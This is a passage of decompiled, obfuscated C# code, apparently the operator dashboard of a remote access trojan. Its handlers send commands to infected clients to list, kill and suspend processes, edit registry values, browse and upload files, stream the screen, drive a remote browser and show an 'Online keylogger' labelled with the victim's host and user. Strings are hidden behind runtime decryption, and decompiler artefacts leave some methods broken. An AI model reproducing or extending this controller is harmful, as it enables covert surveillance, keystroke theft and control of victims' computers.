                this.fThumb_0.method_0(class2.SelectedItems[0].Text, this.string_0, this.string_1, this.string_2, this.string_3);
                this.fThumb_0.method_1();
                Class136.Class138 class3 = new Class136.Class138();
                class3.string_0 = this.string_4;
                class3.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("thumb_data|", class2.SelectedItems[0].Tag), "|"), Class130.fSettings_0.vmethod_92().Text), "|"), Class130.fSettings_0.vmethod_86().Text));
                class3.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                {
                    new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                }
            }
        }
        class2 = null;
    }

    private void method_268(object sender, DrawItemEventArgs e)
    {
        if (e.Index > -1)
        {
            Class127 class2 = (Class127) this.vmethod_746().Items[e.Index];
            e.DrawBackground();
            e.Graphics.DrawImage(class2.method_2(), e.Bounds.Left + 5, e.Bounds.Top);
            e.Graphics.DrawString(class2.method_0(), new Font(this.Font, FontStyle.Regular), Brushes.Black, (float) (class2.method_2().Width + 10), (float) e.Bounds.Top, StringFormat.GenericDefault);
        }
    }

    public void method_269()
    {
        if (base.InvokeRequired)
        {
            base.Invoke(new Delegate41(this.method_269), new object[0]);
        }
        else if (this.Text.Length > 0)
        {
            this.Text = string.Empty;
        }
        else
        {
            this.Text = this.string_9;
        }
    }

    private void method_27(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 0;
        this.method_41();
    }

    private void method_270(object sender, DoWorkEventArgs e)
    {
        while (true)
        {
            this.method_269();
            Thread.Sleep(0x3e8);
        }
    }

    private void method_271(object sender, EventArgs e)
    {
        if (Operators.ConditionalCompareObjectNotEqual(this.vmethod_776().Tag, "1", true))
        {
            this.vmethod_776().Tag = "1";
            this.method_273();
            if (!this.vmethod_810().IsBusy)
            {
                this.vmethod_810().RunWorkerAsync();
            }
        }
    }

    private void method_272(object sender, DoWorkEventArgs e)
    {
        object[] objArray = new object[] { this, sender, e };
        Class149.smethod_0().method_139(Class149.smethod_1(), ")&O<=*?:gq", objArray);
    }

    public void method_273()
    {
        object[] objArray = new object[] { this };
        Class149.smethod_0().method_139(Class149.smethod_1(), ")&O='*?7Hg", objArray);
    }

    private void method_274()
    {
        object[] objArray = new object[] { this };
        Class149.smethod_0().method_139(Class149.smethod_1(), ")&O<q*?8H.", objArray);
    }

    private void method_275(object sender, EventArgs e)
    {
        object[] objArray = new object[] { this, sender, e };
        Class149.smethod_0().method_139(Class149.smethod_1(), ")&O=<*?9kV", objArray);
    }

    private void method_276(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_784().Text) | (Conversion.Val(this.vmethod_784().Text) < 1.0)) | (Conversion.Val(this.vmethod_784().Text) > 65535.0))
        {
            this.vmethod_784().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_784().BackColor = Color.White;
        }
    }

    private void method_277(object sender, EventArgs e)
    {
        object[] objArray = new object[] { this, sender, e };
        Class149.smethod_0().method_139(Class149.smethod_1(), ")&O<c*?;O0", objArray);
    }

    private void method_278(object sender, EventArgs e)
    {
        if (this.process_0 != null)
        {
            this.process_0.Kill();
        }
    }

    private void method_279(object sender, EventArgs e)
    {
        Interaction.MsgBox("This port has to be forwarded!", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_28(object sender, EventArgs e)
    {
        this.vmethod_508().SendToBack();
        this.vmethod_18().SelectedIndex = 2;
        this.method_41();
    }

    private void method_280(object sender, EventArgs e)
    {
        if (this.long_0 > 0L)
        {
            SendMessage((IntPtr) this.long_0, 0x100, 0x74, 0);
            SendMessage((IntPtr) this.long_0, 0x101, 0x74, 0);
        }
    }

    private void method_281(object sender, EventArgs e)
    {
        if (this.long_0 > 0L)
        {
            SendMessage((IntPtr) this.long_0, 0x100, 120, 0);
            SendMessage((IntPtr) this.long_0, 0x101, 120, 0);
        }
    }

    private void method_282(object sender, EventArgs e)
    {
        if (this.long_0 > 0L)
        {
            SendMessage((IntPtr) this.long_0, 0x100, 0x75, 0);
            SendMessage((IntPtr) this.long_0, 0x101, 0x75, 0);
        }
    }

    private void method_283(object sender, EventArgs e)
    {
        if (this.long_0 > 0L)
        {
            SendMessage((IntPtr) this.long_0, 0x100, 0x76, 0);
            SendMessage((IntPtr) this.long_0, 0x101, 0x76, 0);
        }
    }

    private void method_284(object sender, EventArgs e)
    {
        if (this.long_0 > 0L)
        {
            SendMessage((IntPtr) this.long_0, 0x100, 0x77, 0);
            SendMessage((IntPtr) this.long_0, 0x101, 0x77, 0);
        }
    }

    private void method_285(object sender, EventArgs e)
    {
        if (this.vmethod_812().Checked)
        {
            this.vmethod_720().Items.Clear();
            this.vmethod_720().View = View.Details;
            this.vmethod_720().SmallImageList = this.imageList_1;
            this.vmethod_812().Checked = false;
        }
        else
        {
            this.vmethod_720().View = View.LargeIcon;
            this.vmethod_720().LargeImageList = this.imageList_2;
            this.vmethod_720().AutoArrange = false;
            this.vmethod_720().TileSize = new Size(0x80, 0x80);
            this.vmethod_720().Items.Clear();
            this.vmethod_812().Checked = true;
        }
        if (this.string_8.Length >= 3)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_286(object sender, EventArgs e)
    {
        if (this.vmethod_280().TextLength > 0)
        {
            string text = this.vmethod_280().Text;
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "Text file |*.txt";
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                Class136.Class142 class2 = new Class136.Class142();
                class2.string_0 = dialog.FileName;
                class2.byte_0 = Encoding.Unicode.GetBytes(text);
                class2.bool_0 = false;
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_287(object sender, EventArgs e)
    {
    }

    private void method_288(object sender, EventArgs e)
    {
        this.bool_2 = this.vmethod_818().Checked;
        if (!this.bool_2)
        {
            this.fKeylogOnline_0.Visible = false;
        }
        else
        {
            bool flag = false;
            Form form2 = this;
            Form form = this.fKeylogOnline_0;
            Rectangle rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
            form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
            if (flag)
            {
                form.Visible = true;
            }
            this.fKeylogOnline_0.Opacity = 100.0;
            string[] textArray1 = new string[9];
            textArray1[0] = "Online keylogger - ";
            textArray1[1] = this.string_0;
            textArray1[2] = ":";
            textArray1[3] = this.string_1;
            textArray1[4] = "^";
            textArray1[5] = this.string_2;
            textArray1[6] = " [";
            textArray1[7] = this.string_3;
            textArray1[8] = "]";
            this.fKeylogOnline_0.Text = string.Concat(textArray1);
            this.fKeylogOnline_0.Visible = true;
            this.fKeylogOnline_0.Activate();
            if (this.vmethod_286().TextLength > 0)
            {
                this.fKeylogOnline_0.vmethod_0().Rtf = this.vmethod_286().Rtf;
            }
        }
    }

    private void method_289(object sender, MeasureItemEventArgs e)
    {
        e.ItemHeight = this.imageList_3.ImageSize.Height;
        e.ItemWidth = this.imageList_3.ImageSize.Width;
    }

    private void method_29(object sender, EventArgs e)
    {
        this.vmethod_78().Enabled = false;
        this.vmethod_78().Items.Clear();
        this.vmethod_508().BringToFront();
        this.vmethod_508().Visible = true;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "prc_list|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_290(object sender, EventArgs e)
    {
        this.vmethod_740().Text = "Selected: 0";
    }

    private void method_291(object sender, EventArgs e)
    {
        if (this.vmethod_748().Items.Count > 0)
        {
            this.vmethod_730().Enabled = false;
            this.vmethod_728().Enabled = false;
            this.vmethod_724().Enabled = false;
            this.vmethod_726().Enabled = false;
            this.vmethod_744().Enabled = false;
            this.vmethod_746().Enabled = false;
            this.vmethod_748().Enabled = false;
            this.vmethod_750().Items.Clear();
            this.vmethod_750().BackColor = Color.White;
            this.vmethod_754().BringToFront();
            this.vmethod_754().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("reg_keys_get|", this.vmethod_748().SelectedItems[0].Tag));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_292(object sender, EventArgs e)
    {
        if (this.vmethod_750().SelectedItems.Count != 0)
        {
            string s = Interaction.InputBox("Enter new value data", Application.ProductName, string.Empty, -1, -1);
            if (s.Length != 0)
            {
                if (s.Length > 0)
                {
                    string str2 = "1";
                    string text = this.vmethod_750().SelectedItems[0].Text;
                    string str4 = Conversions.ToString(this.vmethod_750().SelectedItems[0].Tag);
                    string left = this.vmethod_750().SelectedItems[0].SubItems[1].Text;
                    if (Operators.CompareString(left, "REG_NONE", true) == 0)
                    {
                        str2 = "0";
                    }
                    else if (Operators.CompareString(left, "REG_SZ", true) == 0)
                    {
                        str2 = "1";
                    }
                    else if (Operators.CompareString(left, "REG_EXPAND_SZ", true) == 0)
                    {
                        str2 = "2";
                    }
                    else if (Operators.CompareString(left, "REG_BINARY", true) == 0)
                    {
                        str2 = "3";
                    }
                    else if (Operators.CompareString(left, "REG_DWORD", true) == 0)
                    {
                        str2 = "4";
                    }
                    else if (Operators.CompareString(left, "REG_DWORD_BIG_ENDIAN", true) == 0)
                    {
                        str2 = "5";
                    }
                    else if (Operators.CompareString(left, "REG_LINK", true) == 0)
                    {
                        str2 = "6";
                    }
                    else if (Operators.CompareString(left, "REG_MULTI_SZ", true) == 0)
                    {
                        str2 = "7";
                    }
                    else if (Operators.CompareString(left, "REG_RESOURCE_LIST", true) == 0)
                    {
                        str2 = "8";
                    }
                    else if (Operators.CompareString(left, "REG_FULL_RESOURCE_DESCRIPTOR", true) == 0)
                    {
                        str2 = "9";
                    }
                    else if (Operators.CompareString(left, "REG_RESOURCE_REQUIREMENTS_LIST", true) == 0)
                    {
                        str2 = "10";
                    }
                    else if (Operators.CompareString(left, "REG_QWORD", true) == 0)
                    {
                        str2 = "11";
                    }
                    string[] textArray1 = new string[] { "reg_val_edit|", str4, "|", Convert.ToBase64String(Encoding.UTF8.GetBytes(text)), "|", str2, "|", Convert.ToBase64String(Encoding.UTF8.GetBytes(s)) };
                    Class136.Class138 class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = string.Concat(textArray1);
                    class2.long_0 = 0L;
                    try
                    {
                        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                        {
                            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                        }
                    }
                    catch (Exception exception1)
                    {
                        Exception ex = exception1;
                        ProjectData.SetProjectError(ex);
                        Exception local2 = ex;
                        ProjectData.ClearProjectError();
                    }
                }
                else
                {
                    Interaction.MsgBox("Invalid value!", MsgBoxStyle.Exclamation, Application.ProductName);
                }
            }
        }
    }

    private void method_293(object sender, MouseEventArgs e)
    {
        this.vmethod_766().Enabled = this.string_7.Length > 0;
        this.vmethod_772().Enabled = this.vmethod_748().SelectedItems.Count > 0;
    }

    private void method_294(object sender, MouseEventArgs e)
    {
        this.vmethod_764().Enabled = this.vmethod_750().SelectedItems.Count > 0;
    }

    private void method_295(object sender, EventArgs e)
    {
        if (this.vmethod_76().Items.Count > 0)
        {
            this.vmethod_446().Enabled = false;
            this.vmethod_448().Enabled = false;
            this.vmethod_452().Enabled = false;
            this.vmethod_450().Enabled = false;
            this.vmethod_696().Enabled = false;
            this.vmethod_454().Enabled = false;
            this.vmethod_76().Enabled = false;
            this.vmethod_720().Items.Clear();
            this.vmethod_720().BackColor = Color.White;
            this.vmethod_474().BringToFront();
            this.vmethod_474().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("files_get|", this.vmethod_76().SelectedItems[0].Tag), "|"), Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_296(object sender, MouseEventArgs e)
    {
        ListViewItem item = this.vmethod_316().HitTest(e.Location).Item;
        if (item != null)
        {
            Class123 class2 = new Class123();
            class2.fDashboard_0 = this;
            class2.int_0 = item.Index;
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    public void method_3(ref string string_12)
    {
        ImageList list1 = new ImageList();
        list1.ImageSize = new Size(0x18, 20);
        this.imageList_1 = list1;
        ImageList list2 = new ImageList();
        list2.ImageSize = new Size(0x80, 0x80);
        this.imageList_2 = list2;
        if (this.vmethod_454().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_454().Invoke(new Delegate2(this.method_3), args);
        }
        else
        {
            this.vmethod_474().SendToBack();
            this.vmethod_474().Visible = false;
            this.vmethod_454().Items.Clear();
            int num = 0;
            List<JToken>.Enumerator enumerator = Enumerable.ToList<JToken>(JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"]).GetEnumerator();
            while (enumerator.MoveNext())
            {
                int num2;
                JToken current = enumerator.Current;
                string str = current["letter"].ToString();
                current["label"].ToString();
                string str2 = current["type"].ToString();
                string str3 = current["filesystem"].ToString();
                string str4 = current["sizetotal"].ToString();
                string str5 = current["sizefree"].ToString();
                string str6 = current["sizeused"].ToString();
                if (Operators.CompareString(current["issys"].ToString(), "1", true) == 0)
                {
                    num = num2;
                }
                Image image = Class136.smethod_18(ref Convert.FromBase64String(current["icon"].ToString()));
                string[] textArray1 = new string[12];
                textArray1[0] = str2;
                textArray1[1] = " ";
                textArray1[2] = str;
                textArray1[3] = " [";
                textArray1[4] = str6;
                textArray1[5] = " / ";
                textArray1[6] = str4;
                textArray1[7] = " - Free: ";
                textArray1[8] = str5;
                textArray1[9] = "][";
                textArray1[10] = str3;
                textArray1[11] = "]";
                this.imageList_1.Images.Add(string.Concat(textArray1), image);
                string[] textArray2 = new string[12];
                textArray2[0] = str2;
                textArray2[1] = " ";
                textArray2[2] = str;
                textArray2[3] = " [";
                textArray2[4] = str6;
                textArray2[5] = " / ";
                textArray2[6] = str4;
                textArray2[7] = " - Free: ";
                textArray2[8] = str5;
                textArray2[9] = "][";
                textArray2[10] = str3;
                textArray2[11] = "]";
                Class127 item = new Class127(string.Concat(textArray2), image);
                this.vmethod_454().Items.Add(item);
                num2++;
                Application.DoEvents();
            }
            this.collection_1.Clear();
            this.vmethod_696().Enabled = true;
            this.vmethod_446().Enabled = false;
            this.vmethod_448().Enabled = false;
            if (this.vmethod_454().Items.Count > 0)
            {
                this.vmethod_454().SelectedIndex = num;
                this.vmethod_76().Enabled = true;
                this.vmethod_720().Enabled = true;
            }
        }
    }

    private void method_30(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_78();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "prc_suspend|" + class2.Items[num2].SubItems[3].Text;
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_31(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_78();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "prc_kill|" + class2.Items[num2].SubItems[3].Text;
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_32(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_78();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "prc_resume|" + class2.Items[num2].SubItems[3].Text;
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_33(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_78();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "prc_priority|" + class2.Items[num2].SubItems[3].Text + "|1";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_34(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_78();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "prc_priority|" + class2.Items[num2].SubItems[3].Text + "|2";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_35(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_78();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "prc_priority|" + class2.Items[num2].SubItems[3].Text + "|3";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_36(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_78();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "prc_priority|" + class2.Items[num2].SubItems[3].Text + "|4";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_37(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_78();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "prc_priority|" + class2.Items[num2].SubItems[3].Text + "|5";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_38(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_78();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "prc_priority|" + class2.Items[num2].SubItems[3].Text + "|6";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_39(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 3;
        this.method_41();
        if (this.vmethod_454().Items.Count == 0)
        {
            this.method_228();
        }
    }

    public void method_4(ref long long_1, ref string string_12)
    {
        // Unresolved stack state at '0000000D'
    }

    private void method_40()
    {
        Class136.Class138 class2;
        int selectedIndex = this.vmethod_18().SelectedIndex;
        if (selectedIndex == 1)
        {
            class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "screenlive_dim|" + Conversions.ToString(this.vmethod_24().Width) + "|" + Conversions.ToString(this.vmethod_24().Height);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
        else if (selectedIndex == 11)
        {
            class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "remotebrowser_dim|" + Conversions.ToString(this.vmethod_464().Width) + "|" + Conversions.ToString(this.vmethod_464().Height);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_41()
    {
        this.vmethod_554().Left = (int) Math.Round((double) ((this.vmethod_552().Left + (((double) this.vmethod_552().Width) / 2.0)) - (((double) this.vmethod_554().Width) / 2.0)));
        this.vmethod_554().Top = (int) Math.Round((double) ((this.vmethod_552().Top + (((double) this.vmethod_552().Height) / 2.0)) - (((double) this.vmethod_554().Height) / 2.0)));
        this.vmethod_120().Left = (int) Math.Round((double) ((this.vmethod_78().Left + (((double) this.vmethod_78().Width) / 2.0)) - (((double) this.vmethod_120().Width) / 2.0)));
        this.vmethod_120().Top = (int) Math.Round((double) ((this.vmethod_78().Top + (((double) this.vmethod_78().Height) / 2.0)) - (((double) this.vmethod_120().Height) / 2.0)));
        this.vmethod_508().Left = this.vmethod_120().Left;
        this.vmethod_508().Top = this.vmethod_120().Top;
        this.vmethod_472().Left = (int) Math.Round((double) ((this.vmethod_720().Left + (((double) this.vmethod_720().Width) / 2.0)) - (((double) this.vmethod_472().Width) / 2.0)));
        this.vmethod_472().Top = (int) Math.Round((double) ((this.vmethod_720().Top + (((double) this.vmethod_720().Height) / 2.0)) - (((double) this.vmethod_472().Height) / 2.0)));
        this.vmethod_474().Left = this.vmethod_472().Left;
        this.vmethod_474().Top = this.vmethod_472().Top;
        this.vmethod_290().Left = (int) Math.Round((double) ((this.vmethod_280().Left + (((double) this.vmethod_280().Width) / 2.0)) - (((double) this.vmethod_290().Width) / 2.0)));
        this.vmethod_290().Top = (int) Math.Round((double) ((this.vmethod_280().Top + (((double) this.vmethod_280().Height) / 2.0)) - (((double) this.vmethod_290().Height) / 2.0)));
        this.vmethod_556().Left = this.vmethod_290().Left;
        this.vmethod_556().Top = this.vmethod_290().Top;
        this.vmethod_364().Left = (int) Math.Round((double) ((this.vmethod_718().Left + (((double) this.vmethod_718().Width) / 2.0)) - (((double) this.vmethod_364().Width) / 2.0)));
        this.vmethod_364().Top = (int) Math.Round((double) ((this.vmethod_718().Top + (((double) this.vmethod_718().Height) / 2.0)) - (((double) this.vmethod_364().Height) / 2.0)));
        this.vmethod_512().Left = this.vmethod_364().Left;
        this.vmethod_512().Top = this.vmethod_364().Top;
        this.vmethod_548().Left = (int) Math.Round((double) ((this.vmethod_550().Left + (((double) this.vmethod_550().Width) / 2.0)) - (((double) this.vmethod_548().Width) / 2.0)));
        this.vmethod_548().Top = (int) Math.Round((double) ((this.vmethod_550().Top + (((double) this.vmethod_550().Height) / 2.0)) - (((double) this.vmethod_548().Height) / 2.0)));
        this.vmethod_546().Left = this.vmethod_548().Left;
        this.vmethod_546().Top = this.vmethod_548().Top;
        this.vmethod_576().Left = (int) Math.Round((double) ((this.vmethod_578().Left + (((double) this.vmethod_578().Width) / 2.0)) - (((double) this.vmethod_576().Width) / 2.0)));
        this.vmethod_576().Top = (int) Math.Round((double) ((this.vmethod_578().Top + (((double) this.vmethod_578().Height) / 2.0)) - (((double) this.vmethod_576().Height) / 2.0)));
        this.vmethod_566().Left = this.vmethod_576().Left;
        this.vmethod_566().Top = this.vmethod_576().Top;
        this.vmethod_622().Left = (int) Math.Round((double) ((this.vmethod_624().Left + (((double) this.vmethod_624().Width) / 2.0)) - (((double) this.vmethod_622().Width) / 2.0)));
        this.vmethod_622().Top = (int) Math.Round((double) ((this.vmethod_624().Top + (((double) this.vmethod_624().Height) / 2.0)) - (((double) this.vmethod_622().Height) / 2.0)));
        this.vmethod_614().Left = this.vmethod_622().Left;
        this.vmethod_614().Top = this.vmethod_622().Top;
    }

    private void method_42(object sender, EventArgs e)
    {
        if (this.string_8.Length >= 3)
        {
            this.vmethod_446().Enabled = false;
            this.vmethod_448().Enabled = false;
            this.vmethod_450().Enabled = false;
            this.vmethod_696().Enabled = false;
            this.vmethod_452().Enabled = false;
            this.vmethod_454().Enabled = false;
            this.vmethod_76().Enabled = false;
            this.vmethod_720().Items.Clear();
            this.vmethod_474().BringToFront();
            this.vmethod_474().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_43(object sender, EventArgs e)
    {
        OpenFileDialog dialog = new OpenFileDialog();
        string left = string.Empty;
        if (Operators.CompareString(left, string.Empty, true) == 0)
        {
            Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        }
        dialog.Title = "Select file(s) for upload";
        dialog.InitialDirectory = left;
        dialog.Multiselect = true;
        if (dialog.ShowDialog() == DialogResult.OK)
        {
            string[] fileNames = dialog.FileNames;
            int num = 0;
            while (true)
            {
                long num3;
                if (num >= fileNames.Length)
                {
                    if (MessageBox.Show("Upload " + Conversions.ToString(num3) + " file(s)?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
                    {
                        left = Path.GetDirectoryName(dialog.FileName);
                        Class130.fTransferManager_0.Visible = true;
                        bool flag = false;
                        Form form2 = this;
                        Form form = Class130.fTransferManager_0;
                        Rectangle rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
                        form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
                        if (flag)
                        {
                            form.Visible = true;
                        }
                        Class130.fTransferManager_0.Opacity = 100.0;
                        Class130.fTransferManager_0.Activate();
                        string[] strArray2 = dialog.FileNames;
                        int index = 0;
                        while (true)
                        {
                            if (index >= strArray2.Length)
                            {
                                string str3;
                                ref double numRef;
                                CClient client = Class130.concurrentDictionary_3[str3 = this.string_4];
                                ref string strRef = ref Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
                                ref CClient clientRef = ref client;
                                ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
                                strRef = strRef + "@";
                                byte[] bytes = Encoding.UTF8.GetBytes(strRef);
                                clientRef.sock_async.method_6(bytes);
                                *(numRef = ref clientRef.stats_bytes_out) = numRef + strRef.Length;
                                *(numRef = ref Class130.struct20_0.double_3) = numRef + strRef.Length;
                                *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
                                dictionary[str3] = client;
                                break;
                            }
                            string s = strArray2[index];
                            string str = Strings.Replace(this.vmethod_398().Text, "Path: ", string.Empty, 1, -1, CompareMethod.Text);
                            if (Operators.CompareString(Strings.Mid(str, str.Length, 1), @"\", true) != 0)
                            {
                                str = str + @"\";
                            }
